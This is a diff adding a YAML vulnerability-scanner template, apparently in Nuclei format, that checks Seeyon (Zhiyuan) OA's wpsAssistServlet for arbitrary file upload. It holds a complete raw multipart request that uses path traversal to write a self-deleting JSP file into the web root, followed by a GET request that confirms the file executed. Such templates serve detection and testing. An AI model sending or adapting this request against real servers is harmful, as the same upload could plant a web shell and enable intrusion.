@@ -1,0 +1,43 @@
+id: poc-yaml-zhiyuan-oa-wpsassistservlet-file-upload
+
+info:
+  name: poc-yaml-zhiyuan-oa-wpsassistservlet-file-upload
+  author: xiaobaicai
+  severity: critical
+  tags: xray-converted,fileupload,ct-469699
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20wpsAssistServlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{rand_base(8)}}.jsp&fileId=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="upload"; filename="123.xls"
+        Content-Type: application/vnd.ms-excel
+        
+        <% out.println("{{rand_int(1000, 9999)}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        --59229605f98b8cf290a7b8908b34616b--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+  - raw:
+      - |
+        GET /{{rand_base(8)}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
